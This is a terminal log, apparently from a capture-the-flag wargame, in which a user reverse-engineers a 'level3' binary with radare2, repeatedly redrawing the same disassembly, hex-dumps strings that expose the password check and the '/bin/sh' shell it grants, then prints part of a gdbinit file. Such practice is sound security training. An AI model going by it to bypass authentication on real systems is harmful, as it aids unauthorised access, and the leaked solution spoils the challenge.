                                                   | mov word [local_40h], 0x74                         |
                                                   |    ; [0x6f6e3068:4]=-1                             |
                                                   | mov dword [local_2ah], 0x6f6e3068; .//level3.c:29  |
                                                   |    ; [0x3333:2]=0xffff                             |
                                                   | mov word [local_2eh], 0x3333                       |
                                                   | mov byte [local_30h], 0                            |
                                                   |    ; [0x616b616b:4]=-1                             |
                                                   | mov dword [local_31h], 0x616b616b; .//level3.c:30  |
                                                   |    ; [0x616b:2]=0xffff                             |
                                                   | mov word [local_35h], 0x616b                       |
                                                   | mov byte [local_37h], 0                            |
                                                   |    ; [0x2e32332a:4]=-1                             |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   | push ebp; .//level3.c:25                           |
                                                   | mov ebp, esp                                       |
                                                   | and esp, 0xfffffff0                                |
                                                   |    ; 'P'                                           |
                                                   | sub esp, 0x50                                      |
                                                   |    ; [0x14:4]=-1                                   |
                                                   |    ; 20                                            |
                                                   | mov eax, dword gs:[0x14]                           |
                                                   | mov dword [local_4ch], eax                         |
                                                   | xor eax, eax                                       |
                                                   |    ; [0x626d6f62:4]=-1                             |
                                                   | mov dword [local_23h], 0x626d6f62; .//level3.c:26  |
                                                   |    ; [0x6461:2]=0xffff                             |
                                                   | mov word [local_27h], 0x6461                       |
                                                   | mov byte [local_29h], 0                            |
                                                   |    ; [0x732e2e2e:4]=-1                             |
                                                   | mov dword [local_38h], 0x732e2e2e; .//level3.c:27  |
                                                   |    ; [0x33726333:4]=-1                             |
                                                   | mov dword [local_3ch], 0x33726333                  |
                                                   |    ; 't'                                           |
                                                   |    ; [0x74:2]=0xffff                               |
                                                   |       ; 116                                        |
                                                   | mov word [local_40h], 0x74                         |
                                                   |    ; [0x6f6e3068:4]=-1                             |
                                                   | mov dword [local_2ah], 0x6f6e3068; .//level3.c:29  |
                                                   |    ; [0x3333:2]=0xffff                             |
                                                   | mov word [local_2eh], 0x3333                       |
                                                   | mov byte [local_30h], 0                            |
                                                   |    ; [0x616b616b:4]=-1                             |
                                                   | mov dword [local_31h], 0x616b616b; .//level3.c:30  |
                                                   |    ; [0x616b:2]=0xffff                             |
                                                   | mov word [local_35h], 0x616b                       |
                                                   | mov byte [local_37h], 0                            |
                                                   |    ; [0x2e32332a:4]=-1                             |
                                                   | mov dword [local_42h], 0x2e32332a; .//level3.c:31  |
                                                   |    ; [0x785b2a32:4]=-1                             |
                                                   | mov dword [local_46h], 0x785b2a32                  |
                                                   |    ; ']'                                           |
                                                   |    ; [0x5d:2]=0xffff                               |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   |    ; [0x14:4]=-1                                   |
                                                   |    ; 20                                            |
                                                   | mov eax, dword gs:[0x14]                           |
                                                   | mov dword [local_4ch], eax                         |
                                                   | xor eax, eax                                       |
                                                   |    ; [0x626d6f62:4]=-1                             |
                                                   | mov dword [local_23h], 0x626d6f62; .//level3.c:26  |
                                                   |    ; [0x6461:2]=0xffff                             |
                                                   | mov word [local_27h], 0x6461                       |
                                                   | mov byte [local_29h], 0                            |
                                                   |    ; [0x732e2e2e:4]=-1                             |
                                                   | mov dword [local_38h], 0x732e2e2e; .//level3.c:27  |
                                                   |    ; [0x33726333:4]=-1                             |
                                                   | mov dword [local_3ch], 0x33726333                  |
                                                   |    ; 't'                                           |
                                                   |    ; [0x74:2]=0xffff                               |
                                                   |       ; 116                                        |
                                                   | mov word [local_40h], 0x74                         |
                                                   |    ; [0x6f6e3068:4]=-1                             |
                                                   | mov dword [local_2ah], 0x6f6e3068; .//level3.c:29  |
                                                   |    ; [0x3333:2]=0xffff                             |
                                                   | mov word [local_2eh], 0x3333                       |
                                                   | mov byte [local_30h], 0                            |
                                                   |    ; [0x616b616b:4]=-1                             |
                                                   | mov dword [local_31h], 0x616b616b; .//level3.c:30  |
                                                   |    ; [0x616b:2]=0xffff                             |
                                                   | mov word [local_35h], 0x616b                       |
                                                   | mov byte [local_37h], 0                            |
                                                   |    ; [0x2e32332a:4]=-1                             |
                                                   | mov dword [local_42h], 0x2e32332a; .//level3.c:31  |
                                                   |    ; [0x785b2a32:4]=-1                             |
                                                   | mov dword [local_46h], 0x785b2a32                  |
                                                   |    ; ']'                                           |
                                                   |    ; [0x5d:2]=0xffff                               |
                                                   |       ; 93                                         |
                                                   | mov word [local_4ah], 0x5d                         |
                                                   |    ; 0x31                                          |
                                                   |    ; '1'                                           |
                                                   |    ; 49                                            |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   |    ; [0x626d6f62:4]=-1                             |
                                                   | mov dword [local_23h], 0x626d6f62; .//level3.c:26  |
                                                   |    ; [0x6461:2]=0xffff                             |
                                                   | mov word [local_27h], 0x6461                       |
                                                   | mov byte [local_29h], 0                            |
                                                   |    ; [0x732e2e2e:4]=-1                             |
                                                   | mov dword [local_38h], 0x732e2e2e; .//level3.c:27  |
                                                   |    ; [0x33726333:4]=-1                             |
                                                   | mov dword [local_3ch], 0x33726333                  |
                                                   |    ; 't'                                           |
                                                   |    ; [0x74:2]=0xffff                               |
                                                   |       ; 116                                        |
                                                   | mov word [local_40h], 0x74                         |
                                                   |    ; [0x6f6e3068:4]=-1                             |
                                                   | mov dword [local_2ah], 0x6f6e3068; .//level3.c:29  |
                                                   |    ; [0x3333:2]=0xffff                             |
                                                   | mov word [local_2eh], 0x3333                       |
                                                   | mov byte [local_30h], 0                            |
                                                   |    ; [0x616b616b:4]=-1                             |
                                                   | mov dword [local_31h], 0x616b616b; .//level3.c:30  |
                                                   |    ; [0x616b:2]=0xffff                             |
                                                   | mov word [local_35h], 0x616b                       |
                                                   | mov byte [local_37h], 0                            |
                                                   |    ; [0x2e32332a:4]=-1                             |
                                                   | mov dword [local_42h], 0x2e32332a; .//level3.c:31  |
                                                   |    ; [0x785b2a32:4]=-1                             |
                                                   | mov dword [local_46h], 0x785b2a32                  |
                                                   |    ; ']'                                           |
                                                   |    ; [0x5d:2]=0xffff                               |
                                                   |       ; 93                                         |
                                                   | mov word [local_4ah], 0x5d                         |
                                                   |    ; 0x31                                          |
                                                   |    ; '1'                                           |
                                                   |    ; 49                                            |
                                                   | lea eax, [local_31h]; .//level3.c:34               |
                                                   | mov dword [local_4h], eax                          |
                                                   |    ; 0x2a                                          |
                                                   |    ; '*'                                           |
                                                   |    ; 42                                            |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   |    ; [0x732e2e2e:4]=-1                             |
                                                   | mov dword [local_38h], 0x732e2e2e; .//level3.c:27  |
                                                   |    ; [0x33726333:4]=-1                             |
                                                   | mov dword [local_3ch], 0x33726333                  |
                                                   |    ; 't'                                           |
                                                   |    ; [0x74:2]=0xffff                               |
                                                   |       ; 116                                        |
                                                   | mov word [local_40h], 0x74                         |
                                                   |    ; [0x6f6e3068:4]=-1                             |
                                                   | mov dword [local_2ah], 0x6f6e3068; .//level3.c:29  |
                                                   |    ; [0x3333:2]=0xffff                             |
                                                   | mov word [local_2eh], 0x3333                       |
                                                   | mov byte [local_30h], 0                            |
                                                   |    ; [0x616b616b:4]=-1                             |
                                                   | mov dword [local_31h], 0x616b616b; .//level3.c:30  |
                                                   |    ; [0x616b:2]=0xffff                             |
                                                   | mov word [local_35h], 0x616b                       |
                                                   | mov byte [local_37h], 0                            |
                                                   |    ; [0x2e32332a:4]=-1                             |
                                                   | mov dword [local_42h], 0x2e32332a; .//level3.c:31  |
                                                   |    ; [0x785b2a32:4]=-1                             |
                                                   | mov dword [local_46h], 0x785b2a32                  |
                                                   |    ; ']'                                           |
                                                   |    ; [0x5d:2]=0xffff                               |
                                                   |       ; 93                                         |
                                                   | mov word [local_4ah], 0x5d                         |
                                                   |    ; 0x31                                          |
                                                   |    ; '1'                                           |
                                                   |    ; 49                                            |
                                                   | lea eax, [local_31h]; .//level3.c:34               |
                                                   | mov dword [local_4h], eax                          |
                                                   |    ; 0x2a                                          |
                                                   |    ; '*'                                           |
                                                   |    ; 42                                            |
                                                   | lea eax, [local_2ah]                               |
                                                   | mov dword [esp], eax                               |
                                                   | call sym.imp.strcmp;[ga]                           |
                                                   | test eax, eax                                      |
                                                   | jne 0x804871d;[gb]                                 |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   |    ; [0x74:2]=0xffff                               |
                                                   |       ; 116                                        |
                                                   | mov word [local_40h], 0x74                         |
                                                   |    ; [0x6f6e3068:4]=-1                             |
                                                   | mov dword [local_2ah], 0x6f6e3068; .//level3.c:29  |
                                                   |    ; [0x3333:2]=0xffff                             |
                                                   | mov word [local_2eh], 0x3333                       |
                                                   | mov byte [local_30h], 0                            |
                                                   |    ; [0x616b616b:4]=-1                             |
                                                   | mov dword [local_31h], 0x616b616b; .//level3.c:30  |
                                                   |    ; [0x616b:2]=0xffff                             |
                                                   | mov word [local_35h], 0x616b                       |
                                                   | mov byte [local_37h], 0                            |
                                                   |    ; [0x2e32332a:4]=-1                             |
                                                   | mov dword [local_42h], 0x2e32332a; .//level3.c:31  |
                                                   |    ; [0x785b2a32:4]=-1                             |
                                                   | mov dword [local_46h], 0x785b2a32                  |
                                                   |    ; ']'                                           |
                                                   |    ; [0x5d:2]=0xffff                               |
                                                   |       ; 93                                         |
                                                   | mov word [local_4ah], 0x5d                         |
                                                   |    ; 0x31                                          |
                                                   |    ; '1'                                           |
                                                   |    ; 49                                            |
                                                   | lea eax, [local_31h]; .//level3.c:34               |
                                                   | mov dword [local_4h], eax                          |
                                                   |    ; 0x2a                                          |
                                                   |    ; '*'                                           |
                                                   |    ; 42                                            |
                                                   | lea eax, [local_2ah]                               |
                                                   | mov dword [esp], eax                               |
                                                   | call sym.imp.strcmp;[ga]                           |
                                                   | test eax, eax                                      |
                                                   | jne 0x804871d;[gb]                                 |
                                                   `----------------------------------------------------'
                                                           | |
                                                           | '-----------------------------.
                                                   .-------'                               |
                                                   |                                       |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   |    ; [0x3333:2]=0xffff                             |
                                                   | mov word [local_2eh], 0x3333                       |
                                                   | mov byte [local_30h], 0                            |
                                                   |    ; [0x616b616b:4]=-1                             |
                                                   | mov dword [local_31h], 0x616b616b; .//level3.c:30  |
                                                   |    ; [0x616b:2]=0xffff                             |
                                                   | mov word [local_35h], 0x616b                       |
                                                   | mov byte [local_37h], 0                            |
                                                   |    ; [0x2e32332a:4]=-1                             |
                                                   | mov dword [local_42h], 0x2e32332a; .//level3.c:31  |
                                                   |    ; [0x785b2a32:4]=-1                             |
                                                   | mov dword [local_46h], 0x785b2a32                  |
                                                   |    ; ']'                                           |
                                                   |    ; [0x5d:2]=0xffff                               |
                                                   |       ; 93                                         |
                                                   | mov word [local_4ah], 0x5d                         |
                                                   |    ; 0x31                                          |
                                                   |    ; '1'                                           |
                                                   |    ; 49                                            |
                                                   | lea eax, [local_31h]; .//level3.c:34               |
                                                   | mov dword [local_4h], eax                          |
                                                   |    ; 0x2a                                          |
                                                   |    ; '*'                                           |
                                                   |    ; 42                                            |
                                                   | lea eax, [local_2ah]                               |
                                                   | mov dword [esp], eax                               |
                                                   | call sym.imp.strcmp;[ga]                           |
                                                   | test eax, eax                                      |
                                                   | jne 0x804871d;[gb]                                 |
                                                   `----------------------------------------------------'
                                                           | |
                                                           | '-----------------------------.
                                                   .-------'                               |
                                                   |                                       |
                                                   |                                       |
                                           .------------------------------------------.    |
                                           |  0x8048715 ;[gd]                         |    |
                                           | mov dword [local_1ch], 1; .//level3.c:35 |    |
                                           `------------------------------------------'    |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   |    ; [0x616b:2]=0xffff                             |
                                                   | mov word [local_35h], 0x616b                       |
                                                   | mov byte [local_37h], 0                            |
                                                   |    ; [0x2e32332a:4]=-1                             |
                                                   | mov dword [local_42h], 0x2e32332a; .//level3.c:31  |
                                                   |    ; [0x785b2a32:4]=-1                             |
                                                   | mov dword [local_46h], 0x785b2a32                  |
                                                   |    ; ']'                                           |
                                                   |    ; [0x5d:2]=0xffff                               |
                                                   |       ; 93                                         |
                                                   | mov word [local_4ah], 0x5d                         |
                                                   |    ; 0x31                                          |
                                                   |    ; '1'                                           |
                                                   |    ; 49                                            |
                                                   | lea eax, [local_31h]; .//level3.c:34               |
                                                   | mov dword [local_4h], eax                          |
                                                   |    ; 0x2a                                          |
                                                   |    ; '*'                                           |
                                                   |    ; 42                                            |
                                                   | lea eax, [local_2ah]                               |
                                                   | mov dword [esp], eax                               |
                                                   | call sym.imp.strcmp;[ga]                           |
                                                   | test eax, eax                                      |
                                                   | jne 0x804871d;[gb]                                 |
                                                   `----------------------------------------------------'
                                                           | |
                                                           | '-----------------------------.
                                                   .-------'                               |
                                                   |                                       |
                                                   |                                       |
                                           .------------------------------------------.    |
                                           |  0x8048715 ;[gd]                         |    |
                                           | mov dword [local_1ch], 1; .//level3.c:35 |    |
                                           `------------------------------------------'    |
                                               |                                           |
                                               '----.                                      |
                                                    | .------------------------------------'
                                                    | |
                                                    | |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   |    ; [0x785b2a32:4]=-1                             |
                                                   | mov dword [local_46h], 0x785b2a32                  |
                                                   |    ; ']'                                           |
                                                   |    ; [0x5d:2]=0xffff                               |
                                                   |       ; 93                                         |
                                                   | mov word [local_4ah], 0x5d                         |
                                                   |    ; 0x31                                          |
                                                   |    ; '1'                                           |
                                                   |    ; 49                                            |
                                                   | lea eax, [local_31h]; .//level3.c:34               |
                                                   | mov dword [local_4h], eax                          |
                                                   |    ; 0x2a                                          |
                                                   |    ; '*'                                           |
                                                   |    ; 42                                            |
                                                   | lea eax, [local_2ah]                               |
                                                   | mov dword [esp], eax                               |
                                                   | call sym.imp.strcmp;[ga]                           |
                                                   | test eax, eax                                      |
                                                   | jne 0x804871d;[gb]                                 |
                                                   `----------------------------------------------------'
                                                           | |
                                                           | '-----------------------------.
                                                   .-------'                               |
                                                   |                                       |
                                                   |                                       |
                                           .------------------------------------------.    |
                                           |  0x8048715 ;[gd]                         |    |
                                           | mov dword [local_1ch], 1; .//level3.c:35 |    |
                                           `------------------------------------------'    |
                                               |                                           |
                                               '----.                                      |
                                                    | .------------------------------------'
                                                    | |
                                                    | |
                                                .-----------------------------------------------------------.
                                                |  0x804871d ;[gb]                                          |
                                                |      ; JMP XREF from 0x08048713 (main)                    |
                                                |      ; [0x80487ff:4]=0x65746e45                           |
                                                |      ; "Enter the password> "                             |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   | mov word [local_4ah], 0x5d                         |
                                                   |    ; 0x31                                          |
                                                   |    ; '1'                                           |
                                                   |    ; 49                                            |
                                                   | lea eax, [local_31h]; .//level3.c:34               |
                                                   | mov dword [local_4h], eax                          |
                                                   |    ; 0x2a                                          |
                                                   |    ; '*'                                           |
                                                   |    ; 42                                            |
                                                   | lea eax, [local_2ah]                               |
                                                   | mov dword [esp], eax                               |
                                                   | call sym.imp.strcmp;[ga]                           |
                                                   | test eax, eax                                      |
                                                   | jne 0x804871d;[gb]                                 |
                                                   `----------------------------------------------------'
                                                           | |
                                                           | '-----------------------------.
                                                   .-------'                               |
                                                   |                                       |
                                                   |                                       |
                                           .------------------------------------------.    |
                                           |  0x8048715 ;[gd]                         |    |
                                           | mov dword [local_1ch], 1; .//level3.c:35 |    |
                                           `------------------------------------------'    |
                                               |                                           |
                                               '----.                                      |
                                                    | .------------------------------------'
                                                    | |
                                                    | |
                                                .-----------------------------------------------------------.
                                                |  0x804871d ;[gb]                                          |
                                                |      ; JMP XREF from 0x08048713 (main)                    |
                                                |      ; [0x80487ff:4]=0x65746e45                           |
                                                |      ; "Enter the password> "                             |
                                                | mov dword [esp], str.Enter_the_password_; .//level3.c:37  |
                                                | call sym.imp.printf;[ge]                                  |
                                                | call sym.do_stuff; .//level3.c:39;[gf]                    |
                                                | mov eax, 0; .//level3.c:41                                |
                                                |    ; [0x4c:4]=-1                                          |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   | mov dword [local_4h], eax                          |
                                                   |    ; 0x2a                                          |
                                                   |    ; '*'                                           |
                                                   |    ; 42                                            |
                                                   | lea eax, [local_2ah]                               |
                                                   | mov dword [esp], eax                               |
                                                   | call sym.imp.strcmp;[ga]                           |
                                                   | test eax, eax                                      |
                                                   | jne 0x804871d;[gb]                                 |
                                                   `----------------------------------------------------'
                                                           | |
                                                           | '-----------------------------.
                                                   .-------'                               |
                                                   |                                       |
                                                   |                                       |
                                           .------------------------------------------.    |
                                           |  0x8048715 ;[gd]                         |    |
                                           | mov dword [local_1ch], 1; .//level3.c:35 |    |
                                           `------------------------------------------'    |
                                               |                                           |
                                               '----.                                      |
                                                    | .------------------------------------'
                                                    | |
                                                    | |
                                                .-----------------------------------------------------------.
                                                |  0x804871d ;[gb]                                          |
                                                |      ; JMP XREF from 0x08048713 (main)                    |
                                                |      ; [0x80487ff:4]=0x65746e45                           |
                                                |      ; "Enter the password> "                             |
                                                | mov dword [esp], str.Enter_the_password_; .//level3.c:37  |
                                                | call sym.imp.printf;[ge]                                  |
                                                | call sym.do_stuff; .//level3.c:39;[gf]                    |
                                                | mov eax, 0; .//level3.c:41                                |
                                                |    ; [0x4c:4]=-1                                          |
                                                |    ; 'L'                                                  |
                                                |    ; 76                                                   |
                                                | mov edx, dword [local_4ch]; .//level3.c:42                |
                                                | xor edx, dword gs:[0x14]                                  |
                                                | je 0x8048745;[gg]                                         |
[0x0804867e 16% 2240 level3]> xc @ main
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF  comment
0x0804867e  5589 e583 e4f0 83ec 5065 a114 0000 0089  U.......Pe......
0x0804868e  4424 4c31 c0c7 4424 2362 6f6d 6266 c744  D$L1..D$#bombf.D
0x0804869e  2427 6164 c644 2429 00c7 4424 382e 2e2e  $'ad.D$)..D$8...
0x080486ae  73c7 4424 3c33 6372 3366 c744 2440 7400  s.D$<3cr3f.D$@t.
0x080486be  c744 242a 6830 6e6f 66c7 4424 2e33 33c6  .D$*h0nof.D$.33.
0x080486ce  4424 3000 c744 2431 6b61 6b61 66c7 4424  D$0..D$1kakaf.D$
0x080486de  356b 61c6 4424 3700 c744 2442 2a33 322e  5ka.D$7..D$B*32.
0x080486ee  c744 2446 322a 5b78 66c7 4424 4a5d 008d  .D$F2*[xf.D$J]..
0x080486fe  4424 3189 4424 048d 4424 2a89 0424 e8ff  D$1.D$..D$*..$..
0x0804870e  fcff ff85 c075 08c7 4424 1c01 0000 00c7  .....u..D$......
0x0804871e  0424 ff87 0408 e8f7 fcff ffe8 7ffe ffff  .$..............
0x0804872e  b800 0000 008b 5424 4c65 3315 1400 0000  ......T$Le3.....
0x0804873e  7405 e8fb fcff ffc9 c366 9066 9066 9066  t........f.f.f.f
0x0804874e  9090 5557 5653 e887 fdff ff81 c3a7 1800  ..UWVS..........
0x0804875e  0083 ec0c 8b6c 2420 8db3 0cff ffff e86b  .....l$ .......k
0x0804876e  fcff ff8d 8308 ffff ff29 c6c1 fe02 85f6  .........)......
0x0804877e  7425 31ff 8db6 0000 0000 83ec 04ff 7424  t%1...........t$
0x0804878e  2cff 7424 2c55 ff94 bb08 ffff ff83 c701  ,.t$,U..........
0x0804879e  83c4 1039 f775 e383 c40c 5b5e 5f5d c38d  ...9.u....[^_]..
0x080487ae  7600 f3c3 0000 5383 ec08 e823 fdff ff81  v.....S....#....  ; section 15 va=0x080487b4 pa=0x000007b4 sz=20 vsz=20 rwx=--r-x .fini
0x080487be  c343 1800 0083 c408 5bc3 0300 0000 0100  .C......[.......  ; section 16 va=0x080487c8 pa=0x000007c8 sz=76 vsz=76 rwx=--r-- .rodata
0x080487ce  0200 5b59 6f75 2776 6520 676f 7420 7368  ..[You've got sh
0x080487de  656c 6c5d 2100 2f62 696e 2f73 6800 627a  ell]!./bin/sh.bz
0x080487ee  7a7a 7a7a 7a7a 7a61 702e 2057 524f 4e47  zzzzzzzap. WRONG
0x080487fe  0045 6e74 6572 2074 6865 2070 6173 7377  .Enter the passw
0x0804880e  6f72 643e 2000 011b 033b 3000 0000 0500  ord> ....;0.....  ; section 42 va=0x08048814 pa=0x00000814 sz=52 vsz=52 rwx=m-r-- GNU_EH_FRAME
0x0804881e  0000 ecfb ffff 4c00 0000 99fd ffff 7000  ......L.......p.
0x0804882e  0000 6afe ffff 9400 0000 3cff ffff b400  ..j.......<.....
0x0804883e  0000 9cff ffff 0001 0000 1400 0000 0000  ................  ; section 18 va=0x08048848 pa=0x00000848 sz=228 vsz=228 rwx=--r-- .eh_frame
0x0804884e  0000 017a 5200 017c 0801 1b0c 0404 8801  ...zR..|........
0x0804885e  0000 2000 0000 1c00 0000 98fb ffff a000  .. .............
0x0804886e  0000 000e 0846 0e0c 4a0f 0b74 0478 003f  .....F..J..t.x.?
0x0804887e  1a3b 2a32 2422 2000 0000 4000 0000 21fd  .;*2$" ...@...!.
0x0804888e  ffff d100 0000 0041 0e08 8502 420d 0547  .......A....B..G
0x0804889e  8303 02c5 c341 c50c 0404 1c00 0000 6400  .....A........d.
0x080488ae  0000 cefd ffff c900 0000 0041 0e08 8502  ...........A....
0x080488be  420d 0502 c5c5 0c04 0400 4800 0000 8400  B.........H.....
0x080488ce  0000 80fe ffff 5d00 0000 0041 0e08 8502  ......]....A....
[0x0804867e]> q
r_sys_mkdirp: fail '/home/leviathan3/.config' of '/home/leviathan3/.config/radare2'
leviathan3@leviathan:~$
leviathan3@leviathan:~$ gdb -q level3
Reading symbols from level3...done.
(gdb) q
leviathan3@leviathan:~$
leviathan3@leviathan:~$
leviathan3@leviathan:~$
leviathan3@leviathan:~$
leviathan3@leviathan:~$ cd /usr/local/gdbinit/
leviathan3@leviathan:/usr/local/gdbinit$ ls
README  gdbinit
leviathan3@leviathan:/usr/local/gdbinit$ cat gdbinit
# INSTALL INSTRUCTIONS: save as ~/.gdbinit
#
# DESCRIPTION: A user-friendly gdb configuration file, for x86/x86_64 and ARM platforms.
#
# REVISION : 8.0.5 (18/08/2013)
#
# CONTRIBUTORS: mammon_, elaine, pusillus, mong, zhang le, l0kit,
#               truthix the cyberpunk, fG!, gln
#
# FEEDBACK: http://reverse.put.as - reverser@put.as
#
# NOTES: 'help user' in gdb will list the commands/descriptions in this file
#        'context on' now enables auto-display of context screen
#
# MAC OS X NOTES: If you are using this on Mac OS X, you must either attach gdb to a process
#                 or launch gdb without any options and then load the binary file you want to analyse with "exec-file" option
#                 If you load the binary from the command line, like $gdb binary-name, this will not work as it should
#                 For more information, read it here http://reverse.put.as/2008/11/28/apples-gdb-bug/
#
# UPDATE: This bug can be fixed in gdb source. Refer to http://reverse.put.as/2009/08/10/fix-for-apples-gdb-bug-or-why-apple-forks-are-bad/
#         and http://reverse.put.as/2009/08/26/gdb-patches/ (if you want the fixed binary for i386)
#
#         An updated version of the patch and binary is available at http://reverse.put.as/2011/02/21/update-to-gdb-patches-fix-a-new-bug/
#
# iOS NOTES: iOS gdb from Cydia (and Apple's) suffer from the same OS X bug.
#			 If you are using this on Mac OS X or iOS, you must either attach gdb to a process
#            or launch gdb without any options and then load the binary file you want to analyse with "exec-file" option
#            If you load the binary from the command line, like $gdb binary-name, this will not work as it should
#            For more information, read it here http://reverse.put.as/2008/11/28/apples-gdb-bug/
#
# CHANGELOG: (older changes at the end of the file)
#
#   Version 8.0.6 (05/09/2013)
#     - Add patch command to convert bytes to little-endian and patch memory
#
#   Version 8.0.5 (18/08/2013)
#     - Add commands header and loadcmds to dump Mach-O header information
#     - Other fixes and additions from previous commits
#
#   Version 8.0.4 (08/05/2013)
#     - Detect automatically 32 or 64 bits archs using sizeof(void*).
#       Thanks to Tyilo for the simple but very effective idea!
#     - Typo in hexdump command also fixed by vuquangtrong.
#     - Add shortcuts to attach to VMware kernel debugging gdb stub (kernel32 and kernel64)
#
#   Version 8.0.3 (21/03/2013)
#	  - Add option to colorize or not output (thanks to argp and skier for the request and ideas!)
#     - Convert the escape codes into functions so colors can be easily customized
#	  - Other enhancements available at git commit logs
#       Thanks to Plouj, argp, xristos for their ideas and fixes!
#
#   Version 8.0.2 (31/07/2012)
#     - Merge pull request from mheistermann to support local modifications in a .gdbinit.local file
#     - Add a missing opcode to the stepo command
#
#   Version 8.0.1 (23/04/2012)
#     - Small bug fix to the attsyntax and intelsyntax commands (changing X86 flavor variable was missing)
#
#   Version 8.0 (13/04/2012)
#     - Merged x86/x64 and ARM versions
#     - Added commands intelsyntax and attsyntax to switch between x86 disassembly flavors
#     - Added new configuration variables ARM, ARMOPCODES, and X86FLAVOR
#     - Code cleanups and fixes to the indentation
#     - Bug fixes to some ARM related code
#     - Added the dumpmacho command to memory dump the mach-o header to a file
#
#   TODO:
#

# __________________gdb options_________________

# set to 1 to have ARM target debugging as default, use the "arm" command to switch inside gdb
set $ARM = 0
# set to 0 if you have problems with the colorized prompt - reported by Plouj with Ubuntu gdb 7.2
set $COLOREDPROMPT = 1
# color the first line of the disassembly - default is green, if you want to change it search for
# SETCOLOR1STLINE and modify it :-)
set $SETCOLOR1STLINE = 0
# set to 0 to remove display of objectivec messages (default is 1)
set $SHOWOBJECTIVEC = 1
# set to 0 to remove display of cpu registers (default is 1)
set $SHOWCPUREGISTERS = 1
# set to 1 to enable display of stack (default is 0)
set $SHOWSTACK = 0
# set to 1 to enable display of data window (default is 0)
set $SHOWDATAWIN = 0
# set to 0 to disable colored display of changed registers
set $SHOWREGCHANGES = 1
# set to 1 so skip command to execute the instruction at the new location
# by default it EIP/RIP will be modified and update the new context but not execute the instruction
set $SKIPEXECUTE = 0
# if $SKIPEXECUTE is 1 configure the type of execution
# 1 = use stepo (do not get into calls), 0 = use stepi (step into calls)
set $SKIPSTEP = 1
# show the ARM opcodes - change to 0 if you don't want such thing (in x/i command)
set $ARMOPCODES = 1
# x86 disassembly flavor: 0 for Intel, 1 for AT&T
set $X86FLAVOR = 0
# use colorized output or not
set $USECOLOR = 1
# to use with remote KDP
set $KDP64BITS = -1
set $64BITS = 0

set confirm off
set verbose off
set history filename ~/.gdb_history
set history save

set output-radix 0x10
set input-radix 0x10

# These make gdb never pause in its output
set height 0
set width 0

set $SHOW_CONTEXT = 1
set $SHOW_NEST_INSN = 0

set $CONTEXTSIZE_STACK = 6
set $CONTEXTSIZE_DATA  = 8
set $CONTEXTSIZE_CODE  = 8

# __________________end gdb options_________________
#

# __________________color functions_________________
#
# color codes
set $BLACK = 0
set $RED = 1
set $GREEN = 2
set $YELLOW = 3
set $BLUE = 4
set $MAGENTA = 5
set $CYAN = 6
set $WHITE = 7

# CHANGME: If you want to modify the "theme" change the colors here
#          or just create a ~/.gdbinit.local and set these variables there
set $COLOR_REGNAME = $GREEN
set $COLOR_REGVAL = $BLACK
set $COLOR_REGVAL_MODIFIED  = $RED
set $COLOR_SEPARATOR = $BLUE
set $COLOR_CPUFLAGS = $RED

# this is ugly but there's no else if available :-(
define color
 if $USECOLOR == 1
 	# BLACK
 	if $arg0 == 0
 		echo \033[30m
 	else
 		# RED
	 	if $arg0 == 1
	 		echo \033[31m
	 	else
	 		# GREEN
	 		if $arg0 == 2
	 			echo \033[32m
	 		else
	 			# YELLOW
	 			if $arg0 == 3
	 				echo \033[33m
	 			else
	 				# BLUE
	 				if $arg0 == 4
	 					echo \033[34m
	 				else
	 					# MAGENTA
	 					if $arg0 == 5
	 						echo \033[35m
	 					else
	 						# CYAN
	 						if $arg0 == 6
	 							echo \033[36m
	 						else
	 							# WHITE
	 							if $arg0 == 7
	 								echo \033[37m
	 							end
	 						end
	 					end
	 				end
	 			end
	 		end
	 	end
	 end
 end
end

define color_reset
    if $USECOLOR == 1
	   echo \033[0m
    end
end

define color_bold
    if $USECOLOR == 1
	   echo \033[1m
    end
end

define color_underline
    if $USECOLOR == 1
	   echo \033[4m
    end
end

# this way anyone can have their custom prompt - argp's idea :-)
# can also be used to redefine anything else in particular the colors aka theming
# just remap the color variables defined above
source ~/.gdbinit.local

# can't use the color functions because we are using the set command
if $COLOREDPROMPT == 1
	set prompt \033[31mgdb$ \033[0m
end

# Initialize these variables else comparisons will fail for coloring
# we must initialize all of them at once, 32 and 64 bits, and ARM.
set $oldrax = 0
set $oldrbx = 0
set $oldrcx = 0
set $oldrdx = 0
set $oldrsi = 0
set $oldrdi = 0
set $oldrbp = 0
set $oldrsp = 0
set $oldr8  = 0
set $oldr9  = 0
set $oldr10 = 0
set $oldr11 = 0
set $oldr12 = 0
set $oldr13 = 0
set $oldr14 = 0
set $oldr15 = 0
set $oldeax = 0
set $oldebx = 0
set $oldecx = 0
set $oldedx = 0
set $oldesi = 0
set $oldedi = 0
set $oldebp = 0
set $oldesp = 0
set $oldr0  = 0
set $oldr1  = 0
set $oldr2  = 0
set $oldr3  = 0
set $oldr4  = 0
set $oldr5  = 0
set $oldr6  = 0
set $oldr7  = 0
set $oldsp  = 0
set $oldlr  = 0

# used by ptraceme/rptraceme
set $ptrace_bpnum = 0

# ______________window size control___________
define contextsize-stack
    if $argc != 1
        help contextsize-stack
    else
        set $CONTEXTSIZE_STACK = $arg0
    end
end
document contextsize-stack
Syntax: contextsize-stack NUM
| Set stack dump window size to NUM lines.
end


define contextsize-data
    if $argc != 1
        help contextsize-data
    else
        set $CONTEXTSIZE_DATA = $arg0
    end
end
